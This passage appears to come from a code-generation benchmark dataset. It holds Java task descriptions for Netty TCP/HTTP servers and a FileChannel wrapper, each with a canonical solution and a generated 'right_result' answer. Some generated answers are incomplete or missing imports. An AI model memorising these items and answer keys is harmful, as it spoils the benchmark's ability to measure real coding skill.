logger.info(\"Server close success, uri={}\", url.getUri());\n        } catch (Exception e) {\n            logger.error(\"Server close error, uri={}\", url.getUri(), e);\n        }\n    }\n\n    private void cleanup() {\n        if (serverChannel != null) {\n            serverChannel.close();\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n            bossGroup = null;\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n            workerGroup = null;\n        }\n        if (channelManage != null) {\n            channelManage.close();\n        }\n        if (threadPoolExecutor != null) {\n            threadPoolExecutor.shutdownNow();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.concurrent.DefaultEventExecutorGroup;\nimport org.slf4j.Logger;\n\nimport java.net.URL;\nimport java.util.concurrent.*;\n\npublic class NettyServer {\n    private final NettyServerChannelManage channelManage;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel serverChannel;\n    private final MessageHandler messageHandler;\n    private ThreadPoolExecutor threadPoolExecutor;\n    private final AtomicInteger rejectCounter = new AtomicInteger(0);\n    private final Logger logger;\n    private final URL url;\n    private volatile ChannelState state;\n    private final Codec codec;\n\n    public NettyServer(URL url, MessageHandler messageHandler) {\n        this.url = url;\n        this.messageHandler = messageHandler;\n        this.logger = org.slf4j.LoggerFactory.getLogger(NettyServer.class);\n        this.channelManage = new NettyServerChannelManage();\n        this.codec = new Codec();\n    }\n\n    public boolean open() {\n        try {\n            int port = Integer.parseInt(url.getPort());\n            bossGroup = new NioEventLoopGroup();\n            workerGroup = new NioEventLoopGroup();\n\n            threadPoolExecutor = new ThreadPoolExecutor(\n                    16,\n                    32,\n                    60L,\n                    TimeUnit.SECONDS,\n                    new LinkedBlockingQueue<>(1000),\n                    new ThreadPoolExecutor.CallerRunsPolicy()\n            );\n\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<>() {\n                        @Override\n                        protected void initChannel(Channel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(codec);\n                            pipeline.addLast(new DefaultEventExecutorGroup(8), new RequestHandler(messageHandler, threadPoolExecutor, rejectCounter));\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            serverChannel = bootstrap.bind(port).sync().channel();\n            state = ChannelState.OPEN;\n            return true;\n        } catch (Exception e) {\n            logger.error(\"Failed to start the server\", e);\n            return false;\n        }\n    }\n\n    public void close(int timeout) {\n        if (serverChannel != null && serverChannel.isOpen()) {\n            serverChannel.close().awaitUninterruptibly(timeout, TimeUnit.SECONDS);\n        }\n        cleanup();\n    }\n\n    private void cleanup() {\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n        if (threadPoolExecutor != null) {\n            threadPoolExecutor.shutdownNow();\n        }\n        state = ChannelState.CLOSED;\n    }\n\n    enum ChannelState {\n        OPEN, CLOSED\n    }\n\n    static class RequestHandler extends SimpleChannelInboundHandler<Object> {\n        private final MessageHandler messageHandler;\n        private final ExecutorService threadPool;\n        private final AtomicInteger rejectCounter;\n\n        public RequestHandler(MessageHandler messageHandler, ExecutorService threadPool, AtomicInteger rejectCounter) {\n            this.messageHandler = messageHandler;\n            this.threadPool = threadPool;\n            this.rejectCounter = rejectCounter;\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object msg) {\n            threadPool.submit(() -> {\n                try {\n                    messageHandler.handleMessage(msg);\n                } catch (Exception e) {\n                    rejectCounter.incrementAndGet();\n                }\n            });\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 166,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based HTTP server for handling RPC (Remote Procedure Call) requests. The server should manage incoming connections, process HTTP requests, and handle server lifecycle events (start/stop).\n\nClass Description: NettyHttpServer is a server implementation that uses Netty framework to create a non-blocking HTTP server capable of handling RPC requests. It manages thread pools for request processing and implements proper resource cleanup during shutdown.\n\nAttributes:\n- thread: Thread - The thread in which the Netty server runs\n- logger: Logger - Logger instance for server events (inherited from parent class)\n\nMethods:\n- start(XxlRpcProviderFactory) -> void - Starts the Netty HTTP server on a specified port, initializes thread pools, and sets up request handlers\n  - Input: xxlRpcProviderFactory - Configuration factory containing server parameters like port number and thread pool sizes\n  - Output: None (server runs asynchronously in a separate thread)\n  \n- stop() -> void - Stops the server gracefully by interrupting the server thread and shutting down all resources\n  - Input: None\n  - Output: None (performs cleanup operations)\n\nThe implementation should follow Netty best practices including:\n1. Using separate event loop groups for connection acceptance and request processing\n2. Proper channel pipeline configuration with HTTP codecs and aggregator\n3. Idle connection handling\n4. Graceful shutdown of all resources\n5. Thread pool management for request processing\n6. Proper error handling and logging",
    "Canonical_solution": "import com.wugui.datax.rpc.remoting.net.Server;\nimport com.wugui.datax.rpc.remoting.net.common.NettyConstant;\nimport com.wugui.datax.rpc.remoting.net.params.Beat;\nimport com.wugui.datax.rpc.remoting.provider.XxlRpcProviderFactory;\nimport com.wugui.datax.rpc.util.ThreadPoolUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyHttpServer extends Server {\n\n    private Thread thread;\n\n    @Override\n    public void start(final XxlRpcProviderFactory xxlRpcProviderFactory) {\n        thread = new Thread(() -> {\n            final ThreadPoolExecutor serverHandlerPool = ThreadPoolUtil.makeServerThreadPool(\n                    NettyHttpServer.class.getSimpleName(),\n                    xxlRpcProviderFactory.getCorePoolSize(),\n                    xxlRpcProviderFactory.getMaxPoolSize());\n            EventLoopGroup bossGroup = new NioEventLoopGroup();\n            EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n            try {\n                ServerBootstrap bootstrap = new ServerBootstrap();\n                bootstrap.group(bossGroup, workerGroup)\n                        .channel(NioServerSocketChannel.class)\n                        .childHandler(new ChannelInitializer<SocketChannel>() {\n                            @Override\n                            public void initChannel(SocketChannel channel) {\n                                channel.pipeline()\n                                        .addLast(new IdleStateHandler(0, 0, Beat.BEAT_INTERVAL * 3, TimeUnit.SECONDS))\n                                        .addLast(new HttpServerCodec())\n                                        .addLast(new HttpObjectAggregator(NettyConstant.MAX_LENGTH))\n                                        .addLast(new NettyHttpServerHandler(xxlRpcProviderFactory, serverHandlerPool));\n                            }\n                        })\n                        .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n                ChannelFuture future = bootstrap.bind(xxlRpcProviderFactory.getPort()).sync();\n                logger.info(\">>>>>>>>>>> xxl-rpc remoting server start success, nettype = {}, port = {}\", NettyHttpServer.class.getName(), xxlRpcProviderFactory.getPort());\n                onStarted();\n\n                future.channel().closeFuture().sync();\n            } catch (InterruptedException e) {\n                if (e instanceof InterruptedException) {\n                    logger.info(\">>>>>>>>>>> xxl-rpc remoting server stop.\");\n                } else {\n                    logger.error(\">>>>>>>>>>> xxl-rpc remoting server error.\", e);\n                }\n            } finally {\n                try {\n                    serverHandlerPool.shutdown();\n                } catch (Exception e) {\n                    logger.error(e.getMessage(), e);\n                }\n                try {\n                    workerGroup.shutdownGracefully();\n                    bossGroup.shutdownGracefully();\n                } catch (Exception e) {\n                    logger.error(e.getMessage(), e);\n                }\n            }\n        });\n        thread.setDaemon(true);\n        thread.start();\n    }\n\n    @Override\n    public void stop() {\n        if (thread != null && thread.isAlive()) {\n            thread.interrupt();\n        }\n        onStopped();\n        logger.info(\">>>>>>>>>>> xxl-rpc remoting server destroy success.\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.PooledByteBufAllocator;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.slf4j.Logger;\n\npublic class NettyHttpServer {\n    private final Logger logger;\n    private Thread thread;\n    private final int port;\n    private final int bossThreadCount;\n    private final int workerThreadCount;\n    private final int requestProcessThreadPoolSize;\n\n    public NettyHttpServer(Logger logger, XxlRpcProviderFactory xxlRpcProviderFactory) {\n        this.logger = logger;\n        this.port = xxlRpcProviderFactory.getPort();\n        this.bossThreadCount = xxlRpcProviderFactory.getBossThreadCount();\n        this.workerThreadCount = xxlRpcProviderFactory.getWorkerThreadCount();\n        this.requestProcessThreadPoolSize = xxlRpcProviderFactory.getRequestProcessThreadPoolSize();\n    }\n\n    public void start(XxlRpcProviderFactory xxlRpcProviderFactory) {\n        thread = new Thread(() -> {\n            EventLoopGroup bossGroup = new NioEventLoopGroup(bossThreadCount);\n            EventLoopGroup workerGroup = new NioEventLoopGroup(workerThreadCount);\n\n            try {\n                ServerBootstrap b = new ServerBootstrap();\n                b.group(bossGroup, workerGroup)\n                        .channel(NioServerSocketChannel.class)\n                        .option(ChannelOption.SO_BACKLOG, 1024)\n                        .childOption(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT)\n                        .childHandler(new ChannelInitializer<SocketChannel>() {\n                            @Override\n                            protected void initChannel(SocketChannel ch) throws Exception {\n                                ChannelPipeline pipeline = ch.pipeline();\n                                pipeline.addLast(\"idleStateHandler\", new IdleStateHandler(0, 0, 60));\n                                pipeline.addLast(\"decoder\", new HttpRequestDecoder());\n                                pipeline.addLast(\"aggregator\", new HttpObjectAggregator(65536));\n                                pipeline.addLast(\"encoder\", new HttpResponseEncoder());\n                                pipeline.addLast(\"handler\", new RpcRequestHandler(logger, xxlRpcProviderFactory));\n                            }\n                        });\n\n                ChannelFuture f = b.bind(port).sync();\n                logger.info(\"Netty HTTP server started on port {}\", port);\n                f.channel().closeFuture().sync();\n            } catch (Exception e) {\n                logger.error(\"Error while starting the Netty HTTP server\", e);\n            } finally {\n                bossGroup.shutdownGracefully();\n                workerGroup.shutdownGracefully();\n                logger.info(\"Netty HTTP server shutdown complete\");\n            }\n        });\n        thread.start();\n    }\n\n    public void stop() {\n        if (thread != null && thread.isAlive()) {\n            thread.interrupt();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 167,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process requests.\n\nClass Description: DiscardServer is a Netty-based TCP server that listens on a specified port, accepts incoming connections, and processes client requests using a custom handler. The server uses non-blocking I/O and is designed to be gracefully shutdown when no longer needed.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nDiscardServer: (int port) -> void - Constructor that initializes the server with the specified port number\nrun: () -> void - Starts the server, binds it to the configured port, and begins accepting connections. Throws Exception if any error occurs during startup\nmain: (String[] args) -> void - Entry point that creates and starts the server instance with either a specified port or default port 8080",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class DiscardServer {\n\n    private int port;\n\n    public DiscardServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new DiscardServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = args.length > 0 ? Integer.parseInt(args[0]) : 8080;\n        new DiscardServer(port).run();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class DiscardServer {\n    private final int port;\n\n    public DiscardServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) {\n                     ch.pipeline().addLast(new DiscardServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        } else {\n            port = 8080;\n        }\n        new DiscardServer(port).run();\n    }\n}\n```"
  },
  {
    "Task_id": 168,
    "Instruction": "Task Description: Create a Java class that implements a MySQL-compatible Netty TCP server to handle client connections and MySQL protocol communication.\n\nClass Description: The MysqlNettyServer class is a Netty-based TCP server that handles MySQL protocol connections. It manages client connections, processes MySQL protocol messages, and maintains connection state. The server uses Netty's non-blocking I/O model for high performance.\n\nAttributes:\n- host: String - The host address the server binds to (nullable)\n- port: int - The port number the server listens on\n- connections: static Map<String, MysqlConnection> - Thread-safe map storing active MySQL connections by connection ID\n- eventLoopGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- server: ServerBootstrap - Netty server bootstrap instance for server configuration\n\nMethods:\n- start() -> void - Starts the Netty server, binds to the specified host and port, and begins accepting connections. Throws Exception if binding fails.\n- channelInitializer() -> ChannelInitializer<SocketChannel> - Creates and returns a channel initializer that sets up the pipeline for new connections, including handlers for MySQL protocol processing.\n- close() -> void - Shuts down the server gracefully by closing all connections and releasing resources.\n\nThe class uses Netty's NIO transport and includes handlers for:\n1. MySQL handshake protocol\n2. MySQL message decoding\n3. Connection idle state management\n4. MySQL command processing\n5. Exception handling\n\nThe server maintains thread-safe tracking of active connections and automatically cleans up closed connections.",
    "Canonical_solution": "import io.dingodb.common.concurrent.ThreadPoolBuilder;\nimport io.dingodb.driver.mysql.MysqlConnection;\nimport io.dingodb.net.netty.NettyHandlers;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioChannelOption;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport lombok.Builder;\nimport lombok.Getter;\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.net.StandardSocketOptions;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\n@Slf4j\n@Getter\n@Builder\npublic class MysqlNettyServer {\n    public final String host;\n    public final int port;\n    public static final Map<String, MysqlConnection> connections = new ConcurrentHashMap<>();\n\n    private EventLoopGroup eventLoopGroup;\n    private ServerBootstrap server;\n\n    public void start() throws Exception {\n        server = new ServerBootstrap();\n        eventLoopGroup = new NioEventLoopGroup(151,\n            new ThreadPoolBuilder().name(\"mysql server \" + port).coreThreads(151).maximumThreads(151).build());\n        server\n            .channel(NioServerSocketChannel.class)\n            .group(eventLoopGroup)\n            .childOption(ChannelOption.TCP_NODELAY, true)\n            .childOption(ChannelOption.SO_KEEPALIVE, Boolean.TRUE)\n            .childOption(NioChannelOption.of(StandardSocketOptions.SO_KEEPALIVE), Boolean.TRUE)\n            .childHandler(channelInitializer());\n        if (host != null) {\n            server.localAddress(host, port);\n        } else {\n            server.localAddress(port);\n        }\n        try {\n            server.bind().sync().await();\n        } catch (Exception e) {\n            log.error(e.getMessage(), e);\n            System.exit(-1);\n        }\n    }\n\n    private ChannelInitializer<SocketChannel> channelInitializer() {\n        return new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) {\n                MysqlConnection mysqlConnection = new MysqlConnection(ch);\n                ch.closeFuture().addListener(f -> {\n                    if (mysqlConnection.getId() != null) {\n                        connections.remove(mysqlConnection.getId());\n                    }\n                }).addListener(f -> mysqlConnection.close());\n                ch.pipeline().addLast(\"handshake\", new HandshakeHandler(mysqlConnection));\n                ch.pipeline().addLast(\"decoder\", new MysqlDecoder());\n                MysqlIdleStateHandler mysqlIdleStateHandler = new MysqlIdleStateHandler(\n                    28800, 60);\n                mysqlConnection.mysqlIdleStateHandler = mysqlIdleStateHandler;\n                ch.pipeline().addLast(\"idleStateHandler\", mysqlIdleStateHandler);\n                ch.pipeline()\n                    .addLast(\"mysqlHandler\", new MysqlHandler(mysqlConnection));\n                ch.pipeline().addLast(\"exception\", new NettyHandlers.ExceptionHandler());\n            }\n        };\n    }\n\n    public void close() {\n        eventLoopGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic class MysqlNettyServer {\n    private final String host;\n    private final int port;\n    private static final Map<String, MysqlConnection> connections = new ConcurrentHashMap<>();\n    private EventLoopGroup eventLoopGroup;\n    private ServerBootstrap server;\n\n    public MysqlNettyServer(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        eventLoopGroup = new NioEventLoopGroup();\n        server = new ServerBootstrap();\n        server.group(eventLoopGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(channelInitializer())\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture future = host == null ?\n                server.bind(port).sync() :\n                server.bind(host, port).sync();\n\n        future.channel().closeFuture().sync();\n    }\n\n    private ChannelInitializer<SocketChannel> channelInitializer() {\n        return new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) {\n                ChannelPipeline pipeline = ch.pipeline();\n                pipeline.addLast(new IdleStateHandler(60, 30, 0));\n                pipeline.addLast(new MysqlMessageDecoder());\n                pipeline.addLast(new MysqlHandshakeHandler());\n                pipeline.addLast(new MysqlCommandHandler());\n                pipeline.addLast(new ExceptionHandler());\n            }\n        };\n    }\n\n    public void close() {\n        if (eventLoopGroup != null) {\n            eventLoopGroup.shutdownGracefully();\n        }\n        connections.clear();\n    }\n\n    public static void addConnection(String connectionId, MysqlConnection connection) {\n        connections.put(connectionId, connection);\n    }\n\n    public static void removeConnection(String connectionId) {\n        connections.remove(connectionId);\n    }\n\n    public static MysqlConnection getConnection(String connectionId) {\n        return connections.get(connectionId);\n    }\n}\n\nclass MysqlMessageDecoder extends ByteToMessageDecoder {\n    @Override\n    protected void decode(ChannelHandlerContext ctx, ByteBuf in, List<Object> out) {\n        // Implement MySQL protocol message decoding logic\n    }\n}\n\nclass MysqlHandshakeHandler extends ChannelInboundHandlerAdapter {\n    @Override\n    public void channelActive(ChannelHandlerContext ctx) {\n        // Send MySQL handshake packet\n    }\n}\n\nclass MysqlCommandHandler extends SimpleChannelInboundHandler<ByteBuf> {\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, ByteBuf msg) {\n        // Process MySQL commands like COM_QUERY, COM_PING, etc.\n    }\n}\n\nclass ExceptionHandler extends ChannelInboundHandlerAdapter {\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}\n\nclass MysqlConnection {\n    private final String connectionId;\n    private final Channel channel;\n\n    public MysqlConnection(String connectionId, Channel channel) {\n        this.connectionId = connectionId;\n        this.channel = channel;\n    }\n\n    public String getConnectionId() {\n        return connectionId;\n    }\n\n    public Channel getChannel() {\n        return channel;\n    }\n}\n```"
  },
  {
    "Task_id": 169,
    "Instruction": "Task Description: Implement a Netty-based TCP server class that handles incoming client connections and processes requests using a RESTful service configuration.\n\nClass Description: NettyRestfulService is a final class that implements a RestfulService interface, providing functionality to start and stop a Netty TCP server with configurable host and port settings. It uses Netty's NIO event loop groups for efficient connection handling and includes proper resource cleanup during shutdown.\n\nAttributes:\n- DEFAULT_WORKER_GROUP_THREADS: [int] - Default number of worker threads calculated based on available processors\n- config: [NettyRestfulServiceConfiguration] - Configuration object containing host and port settings\n- serverBootstrap: [ServerBootstrap] - Netty server bootstrap instance for server configuration\n- bossEventLoopGroup: [EventLoopGroup] - Netty event loop group for accepting connections\n- workerEventLoopGroup: [EventLoopGroup] - Netty event loop group for handling I/O operations\n\nMethods:\n- initServerBootstrap() -> [void] - Initializes the server bootstrap with event loop groups, channel type, and pipeline handlers\n- startup() -> [void] - Starts the server by binding to the configured host and port, logs success/failure\n- shutdown() -> [void] - Gracefully shuts down the server by closing event loop groups and releasing resources",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.NettyRuntime;\nimport lombok.RequiredArgsConstructor;\nimport lombok.SneakyThrows;\nimport lombok.extern.slf4j.Slf4j;\nimport org.apache.shardingsphere.elasticjob.restful.pipeline.RestfulServiceChannelInitializer;\n\n@RequiredArgsConstructor\n@Slf4j\npublic final class NettyRestfulService implements RestfulService {\n\n    private static final int DEFAULT_WORKER_GROUP_THREADS = 1 + 2 * NettyRuntime.availableProcessors();\n\n    private final NettyRestfulServiceConfiguration config;\n\n    private ServerBootstrap serverBootstrap;\n\n    private EventLoopGroup bossEventLoopGroup;\n\n    private EventLoopGroup workerEventLoopGroup;\n\n    private void initServerBootstrap() {\n        bossEventLoopGroup = new NioEventLoopGroup();\n        workerEventLoopGroup = new NioEventLoopGroup(DEFAULT_WORKER_GROUP_THREADS);\n        serverBootstrap = new ServerBootstrap()\n                .group(bossEventLoopGroup, workerEventLoopGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new RestfulServiceChannelInitializer(config));\n    }\n\n    @SneakyThrows(InterruptedException.class)\n    @Override\n    public void startup() {\n        initServerBootstrap();\n        ChannelFuture channelFuture = serverBootstrap.bind(config.getHost(), config.getPort());\n        channelFuture.addListener(future -> {\n            if (future.isSuccess()) {\n                log.info(\"Restful Service started on port {}.\", config.getPort());\n            } else {\n                log.error(\"Failed to start Restful Service.\", future.cause());\n            }\n        }).sync();\n    }\n\n    @Override\n    public void shutdown() {\n        bossEventLoopGroup.shutdownGracefully();\n        workerEventLoopGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic final class NettyRestfulService implements RestfulService {\n    private static final Logger logger = LoggerFactory.getLogger(NettyRestfulService.class);\n    private static final int DEFAULT_WORKER_GROUP_THREADS = Math.max(1, Runtime.getRuntime().availableProcessors() * 2);\n\n    private final NettyRestfulServiceConfiguration config;\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossEventLoopGroup;\n    private final EventLoopGroup workerEventLoopGroup;\n\n    public NettyRestfulService(NettyRestfulServiceConfiguration config) {\n        this.config = config;\n        this.bossEventLoopGroup = new NioEventLoopGroup();\n        this.workerEventLoopGroup = new NioEventLoopGroup(DEFAULT_WORKER_GROUP_THREADS);\n        this.serverBootstrap = new ServerBootstrap();\n        initServerBootstrap();\n    }\n\n    private void initServerBootstrap() {\n        serverBootstrap.group(bossEventLoopGroup, workerEventLoopGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        // Add pipeline handlers here for processing requests\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n    }\n\n    @Override\n    public void startup() {\n        try {\n            ChannelFuture future = serverBootstrap.bind(config.getHost(), config.getPort()).sync();\n            if (future.isSuccess()) {\n                logger.info(\"Netty RESTful service started on {}:{}\", config.getHost(), config.getPort());\n            } else {\n                logger.error(\"Failed to start Netty RESTful service\");\n            }\n        } catch (Exception e) {\n            logger.error(\"Error starting Netty RESTful service\", e);\n        }\n    }\n\n    @Override\n    public void shutdown() {\n        bossEventLoopGroup.shutdownGracefully();\n        workerEventLoopGroup.shutdownGracefully();\n        logger.info(\"Netty RESTful service has been gracefully shut down.\");\n    }\n}\n```"
  },
  {
    "Task_id": 17,
    "Instruction": "Task Description: Create a Java class that provides file channel operations using Java NIO's FileChannel for efficient file I/O operations, including reading, writing, positioning, truncating, and memory mapping.\n\nClass Description: TranslogFileChannel is a wrapper class for FileChannel that simplifies file operations while maintaining the performance benefits of Java NIO. It implements Closeable to ensure proper resource cleanup.\n\nAttributes:\n- location: Path - The file path associated with the FileChannel\n- channel: FileChannel - The underlying FileChannel instance for performing I/O operations\n\nMethods:\n- TranslogFileChannel(Path location) -> void - Constructor that opens a FileChannel for both reading and writing at the specified path\n- write(ByteBuffer src) -> void - Writes data from the given ByteBuffer to the file\n- read(ByteBuffer dst) -> int - Reads data from the file into the given ByteBuffer, returning the number of bytes read\n- position() -> long - Returns the current position in the file\n- position(long newPosition) -> void - Sets the position in the file\n- size() -> long - Returns the current size of the file\n- truncate(long size) -> void - Truncates the file to the specified size\n- force(boolean metaData) -> void - Forces any updates to be written to the storage device\n- transferTo(long position, long count, WritableByteChannel target) -> long - Transfers bytes from this channel to the given writable channel\n- transferFrom(ReadableByteChannel src, long position, long count) -> long - Transfers bytes into this channel from the given readable channel\n- map(FileChannel.MapMode mode, long position, long size) -> MappedByteBuffer - Maps a region of this channel's file directly into memory\n- close() -> void - Closes the FileChannel and releases associated resources",
    "Canonical_solution": "import java.io.Closeable;\nimport java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class TranslogFileChannel implements Closeable {\n\n    private final Path location;\n    private FileChannel channel;\n\n    public TranslogFileChannel(Path location) throws IOException {\n        this.location = location;\n        this.channel = FileChannel.open(location, StandardOpenOption.READ, StandardOpenOption.WRITE);\n    }\n\n    public void write(ByteBuffer src) throws IOException {\n        channel.write(src);\n    }\n\n    public int read(ByteBuffer dst) throws IOException {\n        return channel.read(dst);\n    }\n\n    public long position() throws IOException {\n        return channel.position();\n    }\n\n    public void position(long newPosition) throws IOException {\n        channel.position(newPosition);\n    }\n\n    public long size() throws IOException {\n        return channel.size();\n    }\n\n    public void truncate(long size) throws IOException {\n        channel.truncate(size);\n    }\n\n    public void force(boolean metaData) throws IOException {\n        channel.force(metaData);\n    }\n\n    public long transferTo(long position, long count, WritableByteChannel target) throws IOException {\n        return channel.transferTo(position, count, target);\n    }\n\n    public long transferFrom(ReadableByteChannel src, long position, long count) throws IOException {\n        return channel.transferFrom(src, position, count);\n    }\n\n    public MappedByteBuffer map(MapMode mode, long position, long size) throws IOException {\n        return channel.map(mode, position, size);\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (channel != null) {\n            channel.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
